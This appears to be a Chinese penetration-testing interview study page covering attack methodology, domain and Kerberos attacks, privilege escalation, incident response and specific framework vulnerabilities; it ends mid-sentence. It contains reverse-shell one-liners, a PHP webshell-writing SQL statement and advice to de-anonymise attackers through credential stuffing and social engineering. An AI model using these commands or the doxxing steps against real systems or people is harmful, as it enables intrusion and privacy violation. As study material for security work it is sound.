phpinfo你会关注哪些信息</h3><ol><li><p>绝对路径<code>(_SERVER[“SCRIPT_FILENAME”])</code></p><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/6d50a4d95030412fafc05904c6f6bbad.png" alt="请添加图片描述" /></p></li><li><p>支持程序（中间件），如redis、curl、mysql看是否支持gopher，是否开启fastcgi</p></li><li><p>真实<code>IP_SERVER[“SERVER_ADDR”]</code></p></li><li><p>敏感配置：</p><p><code>allow_url_include</code>：远程文件包含</p><p><code>allow_url_fopen</code>：远程文件读取</p><p><code>disable_functions</code>：表示禁用的函数名</p><p><code>open_basedir</code>：可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径</p><p><code>short_open_tag</code>：允许<code>&lt;??&gt;</code>这种形式，并且<code>&lt;?=</code>等价于<code>&lt;? echo</code></p></li><li><p><code>php.ini</code>配置文件配置：<code>Loaded Configuration File</code></p></li></ol><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="有一个登录框你的渗透思路是什么"><a class="markdownIt-Anchor" href="#有一个登录框你的渗透思路是什么"></a> 有一个登录框，你的渗透思路是什么？</h3><ol><li>【登录】看存不存在sql注入漏洞（万能密码），尝试爆破</li><li>【框架、组件】看看是什么框架，用了什么组件，看存不存在未授权或者其他rce漏洞</li><li>【敏感信息】F12看看网络和源码，寻找有没有敏感信息泄露</li><li>【逻辑漏洞】<ol><li>注册：超长用户名进行覆盖</li><li>找回密码：看返回包有没有<strong>信息泄露</strong>，可不可以预测/更改相关参数，造成<strong>任意密码重置</strong></li><li>验证码：不刷新、没有登录次数限制、可复用/预测、数据包可添加多个手机号</li><li>越权：cookie修改、cookie简单可预测</li></ol></li></ol><h3 id="如何手工判断对方操作系统"><a class="markdownIt-Anchor" href="#如何手工判断对方操作系统"></a> 如何手工判断对方操作系统？</h3><ul><li>修改url中参数，改成大写，正常为windows，不正常即为linux（windows不区分大小写，而linux区分）</li><li>ping服务器，返还得TTL值不一样，windows一般在100以上，linux一般是100以下。</li><li>查看数据包HTTP报头，如果是iis那就肯定是windows</li></ul><h3 id="给你一个目标如何进行渗透测试"><a class="markdownIt-Anchor" href="#给你一个目标如何进行渗透测试"></a> 给你一个目标，如何进行渗透测试</h3><ol><li>获得更多信息<ol><li>真实IP：看是否使用了CDN</li><li>子域名/旁站/C段，以及相似域名（查看该公司的资产结构，例如whois信息、招聘信息、天眼查）</li><li>是否存在waf</li></ol></li><li>对这些域名站点进行渗透<ol><li>是否使用了框架，并查看是否有历史漏洞</li><li>是否使用了有漏洞的中间件</li><li>是否使用了CMS，并查看是否有历史漏洞</li><li>点功能点，看历史请求，重点观察输入输出窗口、上传窗口，js相应API等。对每个可能的漏洞点进行测试，查看是否存在SQL/XSS/未授权访问等等漏洞</li><li>扫目录，看是否存在后台（弱口令）/敏感文件/备份文件</li></ol></li><li>漏洞利用与权限提升<ol><li>使用数据库提升权限（mysql udf、sqlserver xp_cmdshell等）</li><li>使用Linux/Windows的历史漏洞（烂土豆+令牌劫持、脏牛等等）</li></ol></li><li>清除日志数据+生成报告</li></ol><h3 id="给你一个网站你如何判断框架struts2-shiro-springboot"><a class="markdownIt-Anchor" href="#给你一个网站你如何判断框架struts2-shiro-springboot"></a> 给你一个网站，你如何判断框架（struts2、shiro、springboot）</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/Web%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF.png" alt="Web应用指纹分析思路" style="zoom: 33%;" /><p>要判断一个网站使用的是什么框架，可以通过以下几种方式：</p><ol><li><p>查看源代码</p><ul><li>如果能看到power by …</li><li>如果能看到特殊标签：<code>&lt;s:form&gt;</code>…</li></ul></li><li><p>看HTTP请求头：</p><ul><li>X-Work…：直接判断是struts2、springboot</li><li>URL：如果有do、action等等</li></ul></li><li><p>看HTTP cookie</p><p>如果有remember me就可能是shiro</p></li></ol><p>以上方法可以帮助你判断一个网站使用了什么样的框架，包括但不限于Struts2、Shiro、SpringBoot等。</p><h2 id="渗透技巧"><a class="markdownIt-Anchor" href="#渗透技巧"></a> 渗透技巧</h2><h3 id="常用waf绕过手法"><a class="markdownIt-Anchor" href="#常用waf绕过手法"></a> 常用WAF绕过手法</h3><p>这里从以sql注入为例，从三个层面简单总结一下手法。</p><ol><li><p>从架构层面：找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过。</p></li><li><p>从协议层面：分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过。</p></li><li><p>从规则层面：编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染。</p></li></ol><h3 id="反弹shell的常用命令"><a class="markdownIt-Anchor" href="#反弹shell的常用命令"></a> 反弹shell的常用命令</h3><ol><li><code>nc -lvvp 7777 -e /bin.bash</code></li><li><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;</code></li></ol><h1 id="内网渗透"><a class="markdownIt-Anchor" href="#内网渗透"></a> 内网渗透</h1><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E4%BA%8C.png" alt="内网安全二" /></p><h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2><h3 id="内网渗透思路"><a class="markdownIt-Anchor" href="#内网渗透思路"></a> 内网渗透思路</h3><ol><li>代理渗透</li><li>权限维持</li><li>内网信息搜集</li><li>口令爆破</li><li>凭证窃取</li><li>横向渗透</li><li>拿下域控</li></ol><h3 id="内网抓取密码如何抓"><a class="markdownIt-Anchor" href="#内网抓取密码如何抓"></a> 内网抓取密码如何抓</h3><ul><li>可以直接使用mimikatz</li><li>也可以使用procdump，弄下来，然后再离线mimikatz读取</li></ul><h3 id="操作系统什么版本之后抓不到密码抓不到怎么办"><a class="markdownIt-Anchor" href="#操作系统什么版本之后抓不到密码抓不到怎么办"></a> 操作系统什么版本之后抓不到密码？抓不到怎么办</h3><ul><li>windows server 2012之后</li><li>方法：<ul><li>翻阅文件查找运维等等是否记录密码。</li><li>或者hash传递。</li><li>或者获取浏览器的账号密码等等。</li></ul></li></ul><h3 id="内网免杀了解过吗有哪些方法"><a class="markdownIt-Anchor" href="#内网免杀了解过吗有哪些方法"></a> 内网免杀了解过吗？有哪些方法</h3><ol><li>Powershell无文件落地执行</li><li>静态文件免杀：通过修改文件特征马或者加壳</li></ol><p>常用的免杀工具有<code>AVlator</code></p><h3 id="如果拿到域控如何批量判断哪个主机是出网的哪个是不出网"><a class="markdownIt-Anchor" href="#如果拿到域控如何批量判断哪个主机是出网的哪个是不出网"></a> 如果拿到域控，如何批量判断哪个主机是出网的，哪个是不出网？</h3><p>通过组策略，执行命令：<code>ping</code>、<code>curl</code>等</p><h2 id="综合"><a class="markdownIt-Anchor" href="#综合"></a> 综合</h2><h3 id="域信息的搜集思路"><a class="markdownIt-Anchor" href="#域信息的搜集思路"></a> 域信息的搜集思路</h3><ul><li>判断是否存在域</li><li>定位域控</li><li>域基本信息查询（所有域、域信任信息、域密码策略）</li><li>域内用户查询（定位域管）</li><li>域内主机查询</li><li>BloodHound工具</li></ul><h3 id="常见的有什么工具"><a class="markdownIt-Anchor" href="#常见的有什么工具"></a> 常见的有什么工具</h3><p>fscan、adfind、rebues、mimikatz、bloodhound、cs、kerberoasting、powersploit（powerview）、empire、impacket</p><h2 id="横向渗透"><a class="markdownIt-Anchor" href="#横向渗透"></a> 横向渗透</h2><h3 id="kerberos协议的流程"><a class="markdownIt-Anchor" href="#kerberos协议的流程"></a> Kerberos协议的流程</h3><ol><li>主机向KDC发起AS-REQ请求，而KDC返回TGT票据</li><li>主机向KDC发起服务ST请求，而KDC返回TGS票据</li><li>主机拿着TGS访问指定的服务</li></ol><h3 id="kerberos有什么漏洞"><a class="markdownIt-Anchor" href="#kerberos有什么漏洞"></a> Kerberos有什么漏洞</h3><ol><li>ms14-068</li><li>as-req roasting</li><li>kerberoasting</li><li>委派攻击</li></ol><h3 id="ptt-pth-ptk的区别"><a class="markdownIt-Anchor" href="#ptt-pth-ptk的区别"></a> PTT、PTH、PTK的区别</h3><p>PTT是票据传递，一般使用伪造的金银票据注入到内存里面，访问服务，例如mssql等</p><p>PTH是哈希传递，通过抓取内存里面的NTLM哈希，便可以使用impacket工具，横向移动，运行命令</p><p>PTK是在windows发布了补丁后提出的，使用aesKey进行连接，此时PTH只能使用管理员账户的NTLM才能连接</p><h3 id="横向命令执行手段"><a class="markdownIt-Anchor" href="#横向命令执行手段"></a> 横向命令执行手段</h3><p>可以使用：smbexec，wmiwexec，psexec，dromexec，winrm</p><p>还可以使用ipc连接，例如net use</p><h3 id="psexec和wimc或者其他的区别"><a class="markdownIt-Anchor" href="#psexec和wimc或者其他的区别"></a> psexec和wimc或者其他的区别</h3><p>psexec会记录大量日志，而wmic不会（隐蔽）</p><h2 id="权限提升与权限维持"><a class="markdownIt-Anchor" href="#权限提升与权限维持"></a> 权限提升与权限维持</h2><h3 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h3><p><strong>Mysql数据库</strong></p><ol><li>UDF提权<ul><li>用户自定义函数提权</li><li>添加新的函数，实现功能拓展</li><li>将恶意so文件放在<code>lib/plugin</code>里面，然后加载就好了</li></ul></li><li>MOF提权<ul><li>托管对象格式，每5秒监控进程的创建和死亡</li><li>存储路径（覆盖）：<code>c:/windows/system32/wbem/mof/nullevt.mof</code></li><li>与UDF一样，使用load_file和dumpfile函数输出到指定目录即可</li><li>一般用于cmd创建一个管理员权限用户或者反弹shell（恶意Mof文件）</li></ul></li></ol><p><strong>MSSQL提权</strong></p><ol><li><p>xp_cmdshell</p><ul><li><p>扩展存储过程</p><blockquote><p>xp_cmdshell是一个扩展存储过程，<strong>它可以让SQL Server调用操作系统的命令行</strong>，执行一些系统命令或者程序。<strong>存储过程是一种预编译的SQL语句集合，它可以在数据库中创建和保存，方便重复使用</strong>。而xp_cmdshell是特殊的存储过程。</p></blockquote></li><li><p>前提sqlserver服务未降权，有sa权限</p></li><li><p>让管理员有操作cmd的权限，并且以文本的形式输出</p></li></ul></li><li><p>sp_oacreate</p><ul><li>调用OLE组件</li><li>OLE是一个API接口，里面包含了可以重复使用的软件组件</li></ul></li></ol><h3 id="windows提权思路"><a class="markdownIt-Anchor" href="#windows提权思路"></a> windows提权思路</h3><ul><li>系统内核溢出提权；</li><li>数据库提权；</li><li>错误的系统配置提权；</li><li>DLL劫持提权；</li><li>特权第三方软件or服务提权；</li><li>令牌窃取提权；</li><li>web中间件漏洞提权；</li><li>AT，SC，PS提权等等；</li></ul><h3 id="linux提权思路"><a class="markdownIt-Anchor" href="#linux提权思路"></a> linux提权思路</h3><ul><li>suid提权</li><li>sudoer提权</li><li>脏牛提权（内核溢出漏洞）</li><li>环境变量提权</li><li>数据库提权</li></ul><h3 id="什么是黄金票据-白银票据"><a class="markdownIt-Anchor" href="#什么是黄金票据-白银票据"></a> 什么是黄金票据、白银票据</h3><h2 id="隧道代理"><a class="markdownIt-Anchor" href="#隧道代理"></a> 隧道代理</h2><h3 id="目标机器ping不通外网没有办法走网络层协议如何搭建隧道"><a class="markdownIt-Anchor" href="#目标机器ping不通外网没有办法走网络层协议如何搭建隧道"></a> 目标机器ping不通外网，没有办法走网络层协议，如何搭建隧道</h3><p>可以使用基于webshell的内网隧道，例如neo-regeorg还有pystinger。</p><p>如果禁用了一些协议，可使用其他隧道，例如icmp隧道</p><h3 id="正向代理与反向代理的区别"><a class="markdownIt-Anchor" href="#正向代理与反向代理的区别"></a> 正向代理与反向代理的区别</h3><ol><li>正向代理是攻击方连接受害者的监听端口，反向代理是受害方主动请求连接攻击方监听的端口</li><li>正向代理一般是用于连接不出网的机器，而反向代理可以突破防火墙过滤功能。</li></ol><h3 id="内网的多级代理用什么进行代理"><a class="markdownIt-Anchor" href="#内网的多级代理用什么进行代理"></a> 内网的多级代理用什么进行代理</h3><p>可以使用venom、FRP之类的</p><h3 id="如果tcp和udp不出网用什么策略进行代理搭建"><a class="markdownIt-Anchor" href="#如果tcp和udp不出网用什么策略进行代理搭建"></a> 如果tcp和udp不出网，用什么策略进行代理搭建</h3><p>采用隧道，例如DNS和ICMP隧道</p><h2 id="域相关"><a class="markdownIt-Anchor" href="#域相关"></a> 域相关</h2><h3 id="域内攻击有什么方法"><a class="markdownIt-Anchor" href="#域内攻击有什么方法"></a> 域内攻击有什么方法</h3><p>域内攻击可以分为普通的攻击、kerberos和中继攻击的攻击，他们可以构成明文密码泄露、伪造票据、抓取内存哈希等敏感信息泄露，并通过IPC共享、PTT、PTH、PTK传递进行横向渗透。当有其他漏洞，例如永恒之蓝、zeroLogon、noPac、打印机服务（Printnightmare）、Exchange服务（proxy系列漏洞）时，可以一步到位获取到该机器的权限（甚至时域控），然后进行进一步攻击。</p><p>普通攻击有：通过smb、ldap等攻击进行匿名通道查询，然后有密码喷洒、LAPS密码泄露、本地密码泄露（浏览器啥的）、dcsync（高权限）脱密码哈希、LSASS脱密码哈希，然后进行传递</p><p>Kerberos：委派攻击、（限制资源的）约束委派攻击、MS14-068、金银票据、这些可以伪造票据。注入到内存中，可以访问任意/指定服务。当然还有TGS的kerberoasting爆破和TGT的as-req roasting爆破</p><p>NTLM中继：通过中继获取到NTLM，中继的协议可以是LDAP、SMB、HTTP等</p><h3 id="说一下委派攻击"><a class="markdownIt-Anchor" href="#说一下委派攻击"></a> 说一下委派攻击</h3><p>委派机制：域允许用户向拥有委派功能的服务账户，为该用户申请其他服务的票据</p><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_41874930/article/details/110633298">https://blog.csdn.net/qq_41874930/article/details/110633298</a></li><li><a href="https://cloud.tencent.com/developer/article/1899592">https://cloud.tencent.com/developer/article/1899592</a></li><li><a href="https://zhuanlan.zhihu.com/p/541536208">https://zhuanlan.zhihu.com/p/541536208</a></li></ul><h4 id="非约束委派"><a class="markdownIt-Anchor" href="#非约束委派"></a> 非约束委派</h4><p>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。此时，只要DC访问了我们的服务主机，就可以DUMP出DC的TGT，拿到域控。所以诱导DC访问我们即可。如何诱导呢？</p><h4 id="约束委派"><a class="markdownIt-Anchor" href="#约束委派"></a> 约束委派</h4><p>添加了两个协议：s4u3self和s4u2proxy</p><ol><li>用户A访问service1。</li><li>service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。（ST1）</li><li>service1以用户A的身份访问KDC请求一个访问service2的可转发的ticket（ST2）</li><li>service1获取到ticket并以用户A的名义访问service2。</li></ol><blockquote><p>第一个ticket表示域控授权service1代表用户A来访问service1，第二个ticket代表域控授权service1代表用户来访问service2。</p><p>总的来说</p><ul><li>s4u2self解决的问题就是，确定了某台主机可以代表某用户来<strong>对自己进行操作</strong>。</li></ul><ul><li>s4u2proxy解决的问题是确定了某台主机可以代表某用户<strong>对其他主机进行操作</strong>。</li></ul></blockquote><p>综上所述，对<strong>约束性委派利用对核心就是获得可转发的ticket票据</strong>。获取根据约束性委派的执行过程可知，只要控制配置约束性委派服务的机器，并获得了它的密码，那么我们就可以劫持这台主机的kerberos请求过程，伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2，最终获得任意用户权限的ticket票据，这一行为可通过kekeo完成。</p><p>操作过程如下：</p><ol><li>找到有委派的机器（通过adfind即可）</li><li>在我们现在控制的机器下，dump哈希，找到该委派机器的NTLM哈希</li><li>使用该哈希生成委派机器的TGT票据（使用kekeo即可）</li><li>利用这个票据通过伪造S4U请求，以administrator身份访问委派机器的ST</li><li>将得到的ticket导入内存即可</li></ol><h4 id="基于资源的约束委派攻击"><a class="markdownIt-Anchor" href="#基于资源的约束委派攻击"></a> 基于资源的约束委派攻击</h4><p>与传统的约束委派相比，<strong>它不再需要域管理员权限去设置相关属性</strong>。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。</p><ol><li>创建机器账号，添加机器账号并设置为资源委派</li><li>请求票据</li></ol><h3 id="获取域控权限的方法"><a class="markdownIt-Anchor" href="#获取域控权限的方法"></a> 获取域控权限的方法</h3><p>通过服务获取：例如打印机、exchange、tomcat、jboss后台</p><p>通过漏洞获取：zeroLogon、noPac、SYSVOL&amp;GPP、certifried漏洞、永恒之蓝</p><p>通过暴力破解/伪造获取：kerberoasting、MS14-068、委派攻击、DCSync</p><p>通过中继攻击等</p><h3 id="如何定位域控"><a class="markdownIt-Anchor" href="#如何定位域控"></a> 如何定位域控</h3><ul><li>使用命令行工具<ul><li><code>nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com</code></li><li><code>nltest /dclist:domain.com</code></li><li>或者：<code>net group &quot;Domain controllers&quot; /Domain</code>，加上<code>net time /domain</code>显示域控时间</li></ul></li><li>使用Active Directory Sites and Services</li><li>使用PowerShell脚本<ul><li>通过<code>Get-ADDomainController</code>命令获取域控制器信息:<code>Get-ADDomainController -Discover -Service PrimaryDC</code></li></ul></li></ul><h3 id="黄金票据和白银票据说一下"><a class="markdownIt-Anchor" href="#黄金票据和白银票据说一下"></a> 黄金票据和白银票据说一下？</h3><h3 id="权限维持怎么做"><a class="markdownIt-Anchor" href="#权限维持怎么做"></a> 权限维持怎么做</h3><p>分为几个，先区分windows和linux系统。常用的例如自启动、注册表、DLL劫持、计划任务啥的。</p><p>还有就是针对域：</p><ol><li>skeleton key万能钥匙</li><li>DSRM域后门</li><li>金银票据</li><li>sid history</li></ol><h2 id="命令与工具"><a class="markdownIt-Anchor" href="#命令与工具"></a> 命令与工具</h2><h3 id="代理转发工具有什么"><a class="markdownIt-Anchor" href="#代理转发工具有什么"></a> 代理转发工具有什么</h3><ol><li>reGeorg（上传后正向连接）</li><li>frp</li><li>ew</li><li>Venom</li></ol><h3 id="查看进程命令"><a class="markdownIt-Anchor" href="#查看进程命令"></a> 查看进程命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure><h1 id="应急响应与溯源"><a class="markdownIt-Anchor" href="#应急响应与溯源"></a> 应急响应与溯源</h1><h2 id="应急响应的简单流程"><a class="markdownIt-Anchor" href="#应急响应的简单流程"></a> 应急响应的简单流程？</h2><ul><li>收集信息：由安全设备收集主机，样本信息，以及一些客户信息。</li><li>判断类型：是否是安全事件？具体为什么安全事件？挖矿？DOS？等。</li><li>深入分析：从系统角度深入分析，日志，进程，启动项这些去分析。</li><li>清理处置：杀掉异常进程，删除异常文件，打补丁或者修复相关文件等。</li><li>产出报告：对此次安全事件进行一个完整的文档描述</li></ul><h2 id="windowslinux被插入后门文件如何排查"><a class="markdownIt-Anchor" href="#windowslinux被插入后门文件如何排查"></a> Windows/Linux被插入后门文件，如何排查</h2><ol><li>检查日志文件</li><li>检查系统用户是否存在异常</li><li>检查异常进程以及隐藏进程</li><li>检查异常系统文件</li><li>检查端口防火墙</li><li>检查注册表、自启动</li></ol><h2 id="内网告警应该如何处理流程是怎么样的"><a class="markdownIt-Anchor" href="#内网告警应该如何处理流程是怎么样的"></a> 内网告警应该如何处理，流程是怎么样的？</h2><ol><li>具体定位到哪台机器，报警说明知道具体漏洞类型，打相应补丁。</li><li>利用webshell或者是shell查杀工具查杀，查看tmp目录下是非有带有免杀的木马。彻底清除。</li><li>再到全流量分析的机子上看，是非有经过其他的机器。</li><li>拿到攻击ip之后到线上的一些网站查看主机类型，比如360或者微步上，查看是否是傀儡机，vps跳板，或者是国内个人云主机。</li><li>如果是个人云主机，就可以通过whois查看是非有最近绑定的域名，或者绑定者的邮箱。</li><li>知道邮箱之后就可以反查询出qq号说多少，再利用社工查询到手机号，到一个知名的网站或知名软件上查询这个手机号有没有注册过什么网站，可以去这些网站通过撞库的方法登入，这样就可以拿到这个攻击者的身份证，学校，地址这些了</li></ol><h2 id="防火墙怎样判断这是一个反序列化漏洞"><a class="markdownIt-Anchor" href="#防火墙怎样判断这是一个反序列化漏洞"></a> 防火墙怎样判断这是一个反序列化漏洞</h2><p>过滤流量，例如:：</p><ol><li>PHP的序列化流量是：<code>O:s...</code>，而JAVA的反序列化流量的二进制数据流开头是：<code>AC ED 00 05 73 72 00 2E</code></li><li>特殊函数：例如<code>eval</code>、<code>__destruct</code>等等，而JAVA反序列化流量中包含敏感类名，例如<code>SimplePrincipalCollection</code>、<code>TemplatesImpl</code>、<code>JdbcRowSetImpl</code>等。</li></ol><h2 id="应急响应如何查找挖矿病毒如何通过进程找到挖矿文件"><a class="markdownIt-Anchor" href="#应急响应如何查找挖矿病毒如何通过进程找到挖矿文件"></a> 应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？</h2><ol><li><p>查看系统的CPU内存等资源利用率，找最高的进程（使用top），然后定位这个进程的路径在哪里，看看有没有端口开放、外联等</p><blockquote><p>使用top指令发现进程K</p><p>使用netstat -anop发现有无陌生的外连端口</p></blockquote></li><li><p>定位进程的父进程、路径、参数等等，将进程文件托到沙箱检测，看是否为挖矿程序（windows还可以用wmic分析进程参数）</p><blockquote><p><code>ps -ef | grep K</code>找到进程PID为10010</p><p>定位守护程序（关联的进程）：<code>systemctl status 10010</code></p></blockquote></li><li><p>查找是否有定时任务、开启了什么服务（端口），查看服务的日志，看看是否有ssh公钥写入的危险等</p></li></ol><p>处置：终止进程（先终止守护进程，再终止主进程）、清理定时任务、清理恶意文件、恢复服务的安全设置</p><h2 id="webshell流量交互的流量特征"><a class="markdownIt-Anchor" href="#webshell流量交互的流量特征"></a> Webshell流量交互的流量特征?</h2><ul><li>例如菜刀等明文或者base64编码传输数据的webshell而言，其特征有：大量<code>eval</code>等执行函数，还有<code>z0</code>和<code>int_set(&quot;display_errors&quot;,0)</code>的流量特征。</li><li>而对于冰蝎等加密流量而言，数据里面为加密数据，而且交互频繁，在连接shell的瞬间产生大量流量，无论是win窗口，还是长度，都表现一致</li></ul><h2 id="sql注入异常流量分析思路"><a class="markdownIt-Anchor" href="#sql注入异常流量分析思路"></a> SQL注入异常流量分析思路</h2><ol><li>短时间内多次查询，且语句构造的差异小</li><li>查询数据库的语句特征（关键字），例如<code>union/select/sleep/*</code></li></ol><h2 id="假设发现web应用服务器发现文件异常增多初步怀疑被上传webshell描述流量分析溯源的思路"><a class="markdownIt-Anchor" href="#假设发现web应用服务器发现文件异常增多初步怀疑被上传webshell描述流量分析溯源的思路"></a> 假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路?</h2><ol><li>查找流量中有常见webshell的流量特征，例如：菜刀：z0、蚁剑：<code>int_set(“display_errors&quot;,0&quot;)</code>、还有常见恶意函数：eval、assert等，看是那个页面发起的，判断是否可能是webshell</li><li>找出异常IP和所上传的内容，判断是否是webshell，是的话就删除</li></ol><h2 id="sftptelnetssh的端口号ssh与telnet的区别"><a class="markdownIt-Anchor" href="#sftptelnetssh的端口号ssh与telnet的区别"></a> sftp，telnet，ssh的端口号？ssh与telnet的区别？</h2><ul><li>sftp：22，telnet：23，ssh：22。</li><li>简单来说，ssh和telnet的区别就是一个是密文传输，一个是明文传输</li></ul><h2 id="挖矿有了解吗"><a class="markdownIt-Anchor" href="#挖矿有了解吗"></a> 挖矿有了解吗？</h2><ol><li><p>传播：</p><ul><li>网络、邮件钓鱼</li><li>0day RCE：weblogic、jboss的反序列化漏洞，还有redis、hadoop的未授权访问等等</li><li>暴力破解：tomcat、mssql、ssh、rdp</li></ul></li><li><p>持久化：</p><ul><li>WMIC + bypass UAC实现白名单持久化</li><li>定时任务 + wget/curl</li><li>自启动 / 注册表</li></ul></li><li><p>挖矿程序的形态：例如javascript的coinhive还有门罗算法：XMRig</p></li><li><p>如何发现？</p><ol><li>进程 + CPU占用率 + 网络端口开放</li><li>自启动脚本：计划任务等</li><li>相关配置：iptables（防火墙）、/etc/hosts</li><li>日志文件</li></ol></li></ol><h2 id="常见的安全设备有什么"><a class="markdownIt-Anchor" href="#常见的安全设备有什么"></a> 常见的安全设备有什么</h2><p>IDS、IPS、防火墙、DDoS防护设备、蜜罐、WAF等等</p><h2 id="你监控的蜜罐是什么"><a class="markdownIt-Anchor" href="#你监控的蜜罐是什么"></a> 你监控的蜜罐是什么？</h2><p>该蜜罐部署了多个容易被攻击的系统，包括tomcat、redis、jboss等等，当攻击者踩到蜜罐，系统就会发送Jsonp，获取相关百度id，并且记录攻击者路径。</p><p>该系统还对流量进行分析，能够捕获到挖矿病毒的流量、代理转发流量、各种常见Payload</p><h2 id="拿到一个ip你会结合哪些平台上的情报进行溯源分析"><a class="markdownIt-Anchor" href="#拿到一个ip你会结合哪些平台上的情报进行溯源分析"></a> 拿到一个IP，你会结合哪些平台上的情报进行溯源分析？</h2><ol><li>去微步看看是不是恶意IP</li><li>反查域名，看有没有开启网站，然后搜集信息打反攻</li><li>定位完IP，就用百度等信息，查重名（微博、QQ等），去下面的社交平台看有没有敏感信息</li><li>查到电话查名字：支付宝转账确定姓氏、淘宝找回密码确定名字、企业微信手机号查公司名称</li></ol><h2 id="windows加固"><a class="markdownIt-Anchor" href="#windows加固"></a> Windows加固</h2><ul><li>修改3389端口、禁止445端口漏洞</li><li>设置安全策略，不允许SAM账户的匿名枚举，不允许</li><li>SAM账户和共享的匿名枚举在组策略中设置阻止访问注册表编辑工具</li><li>开启审核对象访问，开启审核目录服务访问，开启审核系统事件</li><li>设置屏幕保护在恢复时使用密码保护</li><li>设置Windows密码策略：设密码必须满足复杂性，设置密码长度最小值为8位，最长存留期为30天</li><li>开启Windows防火墙，关闭ping服务，打开3389、80等服务</li><li>关闭系统默认共享</li></ul><h2 id="linux加固"><a class="markdownIt-Anchor" href="#linux加固"></a> Linux加固</h2><ul><li><p>修改ssh的配置文件，禁止root直接登录</p></li><li><p>修改密码策略配置文件，确保密码最小长度为8位</p></li><li><p>确保错误登录3次，锁定此账户5分钟</p></li><li><p>禁止su非法提权，只允许root和wheel组用户su到root</p></li><li><p>不响应ICMP请求</p></li><li><p>设置登陆超时时间为10分钟，结束非法登录用户</p></li></ul><h1 id="漏洞相关"><a class="markdownIt-Anchor" href="#漏洞相关"></a> 漏洞相关</h1><h2 id="phpmyadmin-getshell"><a class="markdownIt-Anchor" href="#phpmyadmin-getshell"></a> phpmyadmin getshell</h2><p><strong>getshell有三种方法：</strong></p><ol><li><p>包含日志文件getshell（有包含漏洞，在网站根目录不可写的情况下）</p><p>设置日志记录打开+设置日志位置</p></li><li><p>into dumpfile和into outfile或者新表getshell</p><p>通过直接<code>select '&lt;?php @eval($_POST[cmd]);?&gt;' into outfile '/var/www/html/shell.php'</code></p><p>当然，得知道网站的根目录，</p></li><li><p>数据库慢查询</p><p>这个是绕过SE=NULL（限制不能输出到什么位置）的方法，慢查询是只有sleep（慢的查询）才会被记录，所以记得sleep一下，一样需要设置日志位置</p></li></ol><p><strong>根目录的查询方法：</strong></p><ol><li>看有没有phpinfo</li><li>执行<code>select @@basedir</code></li><li>看其他敏感文件有没有泄露的</li></ol><p><strong>通常通过爆破的手段进入后台，例如弱口令有：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root root(或空)</span><br><span class="line">mysql mysql</span><br></pre></td></tr></table></figure><p><strong>漏洞：</strong></p><ul><li>乌云的任意文件读取</li><li>CVE-2018-19968：任意文件包含/RCE</li><li>CVE-2016-5734 ：后台RCE</li><li>还有文件包含漏洞</li></ul><h2 id="nacos信息泄露"><a class="markdownIt-Anchor" href="#nacos信息泄露"></a> nacos（信息泄露）</h2><p>未授权访问：可以从它的众多api当中获取到用户名密码，然后登陆上去</p><p>反序列化漏洞：该漏洞听说只能触发一次</p><h2 id="fastjson反序列化"><a class="markdownIt-Anchor" href="#fastjson反序列化"></a> fastjson反序列化</h2><p>fastjson在进行序列化的时候会使用getter和setter方法，但是该方法无法在反序列化的时候将对象还原成响应的类，所以引用了autoType中的<code>@type</code>属性，用于指向反序列化之后的类对象，如果我们将之指向恶意类，便可以执行恶意代码。</p><p>通常我们可以使用的类有：</p><ul><li>使用<code>InetSocketAddress</code>类，进行dnslog探测漏洞存在性</li><li>使用JdbcRowSetImpl类进行RMI服务调用，可以触发远程代码执行（RCE），也可以远程创建文件</li><li>使用TemplatesImpl类进行JNDI注入，可以触发远程代码执行（RCE），也可以加载恶意的jar包</li></ul><p>如果是不出网的利用，则可以使用的类有：</p><p>不出网利用fastjson漏洞的类有（能自己生成恶意类的/能连上外面RMI的）：</p><ul><li>使用BCEL类进行字节码操作，可以触发远程代码执行（RCE），也可以执行任意命令。但是要求目标服务器有 fastjson 1.2.24 以下的版本，<strong>并且能够利用 Java 字节码操作库来生成和执行恶意的字节码</strong><ul><li>它使用bcel字节码然后使用classloader加载，重要在加载上，所以有两种常用的利用链</li><li>他又有两种，一种借助tomcat.dhcp的，一种是TemplatesImpl的</li></ul></li></ul><h2 id="shiro反序列化"><a class="markdownIt-Anchor" href="#shiro反序列化"></a> shiro反序列化</h2><p>它有550和721两种。</p><p>在Shiro框架下，用户登陆成功后会生成一个经过加密的Cookie。其Cookie的Key的值为RememberMe，Value的值是经过<strong>序列化</strong>、<strong>AES加密</strong>和<strong>Base64编码</strong>后得到的结果。</p><p>服务端在接收到一个Cookie时，会按照如下步骤进行解析处理：</p><p>1.检索RememberMe 